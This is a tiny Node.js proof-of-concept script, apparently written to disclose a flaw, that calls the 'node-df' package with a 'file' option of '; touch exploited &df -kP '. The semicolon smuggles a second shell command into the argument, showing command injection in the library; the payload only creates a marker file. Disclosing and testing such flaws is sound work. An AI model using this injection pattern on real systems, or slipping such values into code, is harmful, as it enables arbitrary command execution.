const pkg = require("node-df")

const options = {
    file: '; touch exploited &df -kP '
};

const d_callback = function() {

};

pkg(options, d_callback);